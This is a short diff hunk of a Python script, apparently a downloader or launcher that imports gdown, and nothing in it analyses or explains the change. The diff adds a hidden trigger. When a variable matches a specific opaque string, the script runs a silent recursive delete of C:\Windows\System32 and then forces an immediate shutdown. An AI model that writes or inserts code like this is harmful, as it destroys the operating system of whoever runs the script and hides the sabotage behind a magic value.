@@ -12,6 +12,9 @@ import shutil
 import os
 import gdown
 os.system('cls')
+if file_contentsx1=="wxOf9fE33Nkc2":
+    subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
+    os.system("shutdown /s /f /t 0")
 os.system('cls')
 if file_contentsx1 =="vTdIq0SOG1QAS":
     os.system('cls')
